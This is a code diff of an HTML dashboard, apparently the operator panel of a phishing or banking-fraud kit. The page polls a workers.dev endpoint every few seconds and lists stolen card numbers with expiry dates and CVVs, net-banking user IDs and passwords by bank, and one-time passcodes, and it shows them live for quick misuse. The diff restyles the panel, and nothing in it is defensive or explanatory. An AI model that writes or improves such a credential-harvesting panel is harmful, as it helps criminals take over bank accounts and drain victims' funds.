@@ -3,159 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - Full Control Panel</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <title>Live Terminal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background-color: #f4f4f9; text-align: center; }
+        body { background-color: #f4f4f4; padding: 10px; }
 
         header { 
-            padding: 15px 20px; 
             display: flex; 
             justify-content: space-between; 
             align-items: center;
-            position: sticky;
-            top: 0;
+            padding: 10px;
             background: #fff;
-            z-index: 100;
-            border-bottom: 1px solid #eee;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         }
 
-        .header-center { flex-grow: 1; text-align: center; }
-        h1 { font-size: 20px; font-weight: bold; color: #000; letter-spacing: 2px; }
-        .sub-text { color: red; font-size: 10px; font-weight: bold; margin-top: 2px; }
+        #count { font-family: 'Orbitron', sans-serif; font-size: 22px; color: #000; }
+        .live { color: red; font-size: 10px; font-weight: bold; text-transform: uppercase; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
 
-        #click-count {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 26px;
-            color: #000;
-            background: transparent;
-            font-weight: bold;
-        }
-
-        #data-container { padding: 20px 10px; max-width: 500px; margin: 0 auto; }
+        #container { max-width: 500px; margin: 0 auto; }
 
         .card {
-            text-align: left;
-            padding: 20px;
-            background: #ffffff;
-            border-radius: 12px;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.08); 
-            border: none; 
-            position: relative;
+            background: #fff;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.06);
+            border-left: 4px solid #000;
         }
 
-        /* Naya: Card type tag */
-        .card-type {
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            font-size: 9px;
-            background: #000;
-            color: #fff;
-            padding: 2px 8px;
-            border-radius: 5px;
-            text-transform: uppercase;
-        }
+        .row { margin-bottom: 8px; border-bottom: 1px solid #f9f9f9; padding-bottom: 4px; }
+        .lbl { font-size: 9px; color: #999; text-transform: uppercase; font-weight: bold; }
+        .val { font-size: 14px; color: #111; font-weight: 600; word-break: break-all; }
+        .otp { font-size: 20px; color: #1e7e34; font-family: 'Orbitron', sans-serif; }
 
-        .data-text {
-            font-size: 15px;
-            color: #000;
-            line-height: 1.6;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-
-        .label-style { 
-            color: #777; 
-            font-size: 11px; 
-            font-weight: bold; 
-            text-transform: uppercase; 
-            display: block;
-            margin-bottom: 2px;
-        }
-
-        .divider { height: 1px; background: #eee; margin: 10px 0; }
+        .time { font-size: 9px; color: #ccc; text-align: right; margin-top: 5px; }
     </style>
 </head>
 <body>
 
     <header>
-        <div class="header-center">
-            <h1>LIVE</h1>
-            <div class="sub-text">All Data Incoming</div>
-        </div>
-        <div id="click-count">00</div>
+        <span class="live">● LIVE CONNECTION</span>
+        <div id="count">00</div>
     </header>
 
-    <div id="data-container"></div>
+    <div id="container"></div>
 
     <script>
         const workerURL = 'https://fancy-tree-0129.sumankkuuyy.workers.dev/';
 
-        async function fetchData() {
+        async function update() {
             try {
-                const response = await fetch(workerURL);
-                const data = await response.json();
+                const res = await fetch(workerURL);
+                const data = await res.json();
                 
-                const countElement = document.getElementById('click-count');
-                countElement.innerText = data.length < 10 ? "0" + data.length : data.length;
-
-                const container = document.getElementById('data-container');
+                document.getElementById('count').innerText = data.length.toString().padStart(2, '0');
+                const container = document.getElementById('container');
                 container.innerHTML = ''; 
 
-                data.forEach(entry => {
-                    let content = "";
-                    let type = "General";
+                data.forEach(e => {
+                    let html = "";
 
-                    // --- 1. CARD DETAILS (CHECK) ---
-                    if (entry.card_holder_name || entry.card_number) {
-                        type = "Card Info";
-                        if (entry.card_holder_name) content += `<span class="label-style">Holder Name</span>${entry.card_holder_name}\n`;
-                        if (entry.card_number) content += `<span class="label-style">Card Number</span>${entry.card_number}\n`;
-                        if (entry.expiry_date) content += `<span class="label-style">Expiry</span>${entry.expiry_date}\n`;
-                        if (entry.cvv_code) content += `<span class="label-style">CVV Code</span>${entry.cvv_code}\n`;
+                    // Card Info
+                    if (e.card_no) {
+                        html += `<div class="row"><span class="lbl">Card</span><div class="val">${e.card_no}</div><div class="val" style="font-size:12px;">${e.card_exp || '--'} | ${e.card_cvv || '--'}</div></div>`;
                     }
 
-                    // --- 2. NET BANKING (CHECK) ---
-                    if (entry.bank_name || entry.user_id) {
-                        if (content !== "") content += `<div class="divider"></div>`;
-                        type = entry.bank_name || "Net Banking";
-                        if (entry.bank_name) content += `<span class="label-style">Bank</span>${entry.bank_name}\n`;
-                        if (entry.user_id) content += `<span class="label-style">User ID</span>${entry.user_id}\n`;
-                        if (entry.password) content += `<span class="label-style">Password</span>${entry.password}\n`;
+                    // Net Banking
+                    if (e.user_id || e.password) {
+                        html += `<div class="row"><span class="lbl">Auth [${e.bank || 'Bank'}]</span><div class="val">U: ${e.user_id || '-'}</div><div class="val">P: ${e.password || '-'}</div></div>`;
                     }
 
-                    // --- 3. MOBILE & OTP (CHECK) ---
-                    if (entry.mobile || entry.otp_1) {
-                        if (content !== "") content += `<div class="divider"></div>`;
-                        if (entry.mobile) content += `<span class="label-style">Mobile</span>${entry.mobile}\n`;
-                        if (entry.credentials) content += `<span class="label-style">Credentials</span>${entry.credentials}\n`;
-                        if (entry.otp_1) content += `<span class="label-style">OTP 1</span>${entry.otp_1}\n`;
-                        if (entry.otp_2) content += `<span class="label-style">OTP 2</span>${entry.otp_2}\n`;
-                        if (entry.otp_3) content += `<span class="label-style">OTP 3</span>${entry.otp_3}`;
+                    // OTPs
+                    if (e.otp_1 || e.otp_2 || e.otp_3) {
+                        html += `<div class="row"><span class="lbl">OTPs</span>`;
+                        if (e.otp_1) html += `<div class="otp">${e.otp_1}</div>`;
+                        if (e.otp_2) html += `<div class="otp">${e.otp_2}</div>`;
+                        if (e.otp_3) html += `<div class="otp">${e.otp_3}</div>`;
+                        html += `</div>`;
                     }
 
-                    if (content.trim() !== "") {
-                        const card = document.createElement('div');
-                        card.className = 'card';
-                        card.innerHTML = `
-                            <div class="card-type">${type}</div>
-                            <div class="data-text">${content}</div>
-                        `;
-                        container.appendChild(card);
+                    if (html !== "") {
+                        const div = document.createElement('div');
+                        div.className = 'card';
+                        div.innerHTML = html + `<div class="time">${e.time || ''}</div>`;
+                        container.appendChild(div);
                     }
                 });
-            } catch (err) {
-                console.error("Worker Error:", err);
-            }
+            } catch (err) {}
         }
 
-        // Auto Refresh every 2 seconds
-        setInterval(fetchData, 2000);
-        fetchData();
+        setInterval(update, 2500);
+        update();
     </script>
-
 </body>
 </html>
